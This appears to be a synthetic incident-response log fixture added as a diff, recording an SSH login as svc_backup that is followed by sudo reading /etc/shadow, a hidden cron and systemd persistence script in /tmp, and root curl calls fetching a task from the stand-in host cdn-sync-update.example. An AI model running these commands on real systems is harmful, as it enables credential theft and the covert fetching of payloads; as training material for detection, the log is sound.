@@ -1,0 +1,9 @@
+{"@timestamp":"2026-11-12T08:58:00Z","host":"linux-ir-01.lab.example","source":"sshd","event":"failed_password","user":"svc_backup","source_ip":"10.20.0.44","port":51022}
+{"@timestamp":"2026-11-12T09:00:15Z","host":"linux-ir-01.lab.example","source":"sshd","event":"accepted_password","user":"svc_backup","source_ip":"10.20.0.44","port":51022}
+{"@timestamp":"2026-11-12T09:01:02Z","host":"linux-ir-01.lab.example","source":"sudo","event":"command","user":"svc_backup","command":"/usr/bin/systemctl status cron"}
+{"@timestamp":"2026-11-12T09:02:11Z","host":"linux-ir-01.lab.example","source":"sudo","event":"command","user":"svc_backup","command":"/usr/bin/cat /etc/shadow"}
+{"@timestamp":"2026-11-12T09:03:00Z","host":"linux-ir-01.lab.example","source":"cron","event":"install","user":"svc_backup","path":"/var/spool/cron/crontabs/svc_backup","entry":"*/5 * * * * /tmp/.update.sh"}
+{"@timestamp":"2026-11-12T09:03:30Z","host":"linux-ir-01.lab.example","source":"systemd","event":"service_start","unit":"updater.service","exec":"/tmp/.update.sh"}
+{"@timestamp":"2026-11-12T09:04:12Z","host":"linux-ir-01.lab.example","source":"audit","event":"execve","user":"root","exe":"/bin/sh","args":"-c curl http://cdn-sync-update.example/task"}
+{"@timestamp":"2026-11-12T09:05:00Z","host":"linux-ir-01.lab.example","source":"sshd","event":"session_closed","user":"svc_backup","source_ip":"10.20.0.44","duration_seconds":410}
+{"@timestamp":"2026-11-12T09:03:31Z","host":"linux-ir-01.lab.example","source":"journal","unit":"updater.service","comm":"sh","pid":2214,"message":"curl -s http://cdn-sync-update.example/task -o /tmp/task.json"}
